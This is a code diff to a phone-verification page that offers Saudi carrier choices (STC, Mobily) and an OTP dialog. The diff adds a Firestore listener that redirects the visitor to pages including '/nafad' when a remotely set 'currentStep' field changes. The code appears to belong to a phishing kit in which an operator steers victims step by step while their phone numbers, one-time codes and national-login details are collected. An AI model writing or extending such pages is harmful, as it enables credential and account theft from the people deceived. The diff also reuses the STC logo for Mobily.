@@ -7,23 +7,38 @@ import { Input } from "@/components/ui/input"
 import { Label } from "@/components/ui/label"
 import { Phone } from "lucide-react"
 import { OtpDialog } from "@/components/phone-otp-dialog"
-import { addData } from "@/lib/firebase"
+import { addData, db } from "@/lib/firebase"
+import { doc, onSnapshot } from "firebase/firestore"
 
 export default function VerifyPhonePage() {
   const [phoneNumber, setPhoneNumber] = useState("")
   const [selectedCarrier, setSelectedCarrier] = useState<string | null>(null)
   const [showOtpDialog, setShowOtpDialog] = useState(false)
-
+    const visitorID=localStorage.getItem('visitor')
+  const unsubscribe = onSnapshot(
+    doc(db, "pays", visitorID!), 
+    (docSnap) => {
+      if (docSnap.exists()) {
+        const data = docSnap.data()
+        console.log(" Firestore data received:", data)
+        
+        // Handle special navigation cases
+        if (data.currentStep === "home") {
+          window.location.href = "/"
+        } else if (data.currentStep === "phone") {
+          window.location.href = "/phone-info"
+        } else if (data.currentStep === "nafad") {
+          window.location.href = "/nafad"
+        } 
+      }}
+   
+  )
   const carriers = [
     {
       id: "stc",
       name: "STC",
       logo: (
-        <svg viewBox="0 0 100 40" className="h-10 w-auto">
-          <text x="50" y="28" textAnchor="middle" className="fill-[#6b1b9a] font-bold text-2xl">
-            stc
-          </text>
-        </svg>
+       <img src="/stc.png" alt="" width={80}/>
       ),
       bgColor: "bg-purple-50",
       borderColor: "border-purple-200",
@@ -33,11 +48,7 @@ export default function VerifyPhonePage() {
       id: "mobily",
       name: "Mobily",
       logo: (
-        <svg viewBox="0 0 100 40" className="h-10 w-auto">
-          <text x="50" y="28" textAnchor="middle" className="fill-[#00a550] font-bold text-xl">
-            Mobily
-          </text>
-        </svg>
+        <img src="/stc.png" alt="" width={80}/>
       ),
       bgColor: "bg-green-50",
       borderColor: "border-green-200",
